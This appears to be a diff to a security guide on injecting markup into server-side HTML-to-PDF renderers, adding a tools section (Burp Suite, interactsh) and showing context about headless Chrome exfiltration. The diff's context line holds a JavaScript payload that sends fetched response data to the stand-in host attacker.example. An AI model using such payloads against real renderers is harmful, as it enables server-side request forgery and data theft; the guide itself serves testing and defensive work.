@@ -109,6 +109,11 @@ new Image().src='http://attacker.example/?d='+encodeURIComponent(x.responseText)
 - **Headless Chrome / Puppeteer**: full JavaScript, so `fetch`, `XMLHttpRequest`, and dynamic exfil all run; watch for `--disable-web-security` or missing `file://` restrictions.
 - Delivery is through any field that lands in the template, firing server-side when the PDF is generated.
 
+## Tools
+
+- **[Burp Suite](https://portswigger.net/burp)**: Repeater and Collaborator for injecting markup and catching SSRF or exfil callbacks.
+- **[interactsh](https://github.com/projectdiscovery/interactsh)**: out-of-band capture of renderer-side callbacks.
+
 ## References
 
 - [OWASP: Server-Side Request Forgery](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
